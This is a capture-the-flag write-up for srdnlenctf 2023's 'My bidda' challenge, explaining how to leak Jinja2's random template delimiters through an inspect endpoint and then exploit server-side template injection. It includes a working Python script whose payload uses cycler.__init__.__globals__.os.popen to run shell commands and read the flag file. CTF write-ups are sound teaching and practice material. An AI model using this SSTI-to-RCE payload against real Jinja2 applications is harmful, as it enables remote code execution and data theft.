# srdnlenctf 2023

## My bidda (X solves)

Cities are way overcrowded and noisy, I want to live in a small town. Tell me about your bidda.

One of my friends found a vulnerability but he told me it's fixed now, can you check?


### Solution

In this challenge you need to perform an SSTI attack against Jinja2. Small problem, the template delimiters are random.
To leak the random delimiters we can exploit a vulnerability in the /inspect_bidda endpoint. The template executes 'env.\_\_dict\_\_.get(name)' where name is a parameter we control. Since env is the jinja2 Environment object it contains the attribute variable_start_string, leaking this attribute we can see the random delimiters. After that we can exploit the template injection in /send_bidda to perform a simple RCE that allows to read the flag.

### Exploit

```python
#!/bin/env python3

import requests
import re

req = requests.session()

url = "http://mybidda.challs.srdnlen.it"
res = req.post(url+"/send_bidda", data={"name": "whatever", "population": "whatever", "image": "whatever"})

res = req.get(url+"/inspect_bidda?name=variable_start_string")

key_index = res.text.find("called ")
key = res.text[key_index+7:key_index+18]

payload = key+" cycler.__init__.__globals__.os.popen('cat /home/flag.txt').read() "+key[1:]+'!'
res = req.post(url+"/send_bidda", data={"name": payload, "population": "whatever", "image": "whatever"}).text

flag = re.search("srdnlen{(.*)}", res).group(0)
print(flag)

```
